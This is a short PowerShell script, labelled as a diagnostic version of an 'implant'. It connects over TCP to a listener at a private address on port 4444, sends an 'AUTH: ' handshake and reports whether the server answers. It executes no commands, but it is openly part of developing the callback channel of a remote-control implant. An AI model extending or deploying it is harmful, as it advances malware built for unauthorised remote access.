# DIAGNOSTIC VERSION - Shows EXACT failure point
$ip = '192.168.1.15'; $port = 4444
Write-Host "[DIAG] Starting implant on $ip`:$port" -ForegroundColor Green

try {
    Write-Host "[DIAG] Creating TCP client..." -ForegroundColor Yellow
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    Write-Host "[DIAG] TCP CONNECTED!" -ForegroundColor Green
    
    $stream = $client.GetStream()
    $encoder = New-Object System.Text.UTF8Encoding
    
    Write-Host "[DIAG] Sending AUTH..." -ForegroundColor Yellow
    $authBytes = $encoder.GetBytes("AUTH: ")
    $stream.Write($authBytes, 0, $authBytes.Length)
    $stream.Flush()
    Write-Host "[DIAG] AUTH sent" -ForegroundColor Green
    
    Start-Sleep 2
    Write-Host "[DIAG] Waiting for response..." -ForegroundColor Yellow
    
    $wait = 0
    while (!$stream.DataAvailable -and $wait -lt 20) { 
        Start-Sleep 500; $wait++
        Write-Host "[DIAG] Wait $wait/20" -ForegroundColor Cyan
    }
    
    if ($stream.DataAvailable) {
        Write-Host "[DIAG] Data available!" -ForegroundColor Green
        [byte[]]$buf = New-Object byte[] 512
        $len = $stream.Read($buf, 0, 512)
        $resp = $encoder.GetString($buf, 0, $len)
        Write-Host "[DIAG] Server said: $resp" -ForegroundColor Magenta
    } else {
        Write-Host "[DIAG] NO RESPONSE FROM SERVER - CHECK LISTENER!" -ForegroundColor Red
    }
    
} catch {
    Write-Host "[DIAG] ERROR: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    Write-Host "[DIAG] Diagnostic complete - check console above" -ForegroundColor White
}

Read-Host "Press Enter to exit"
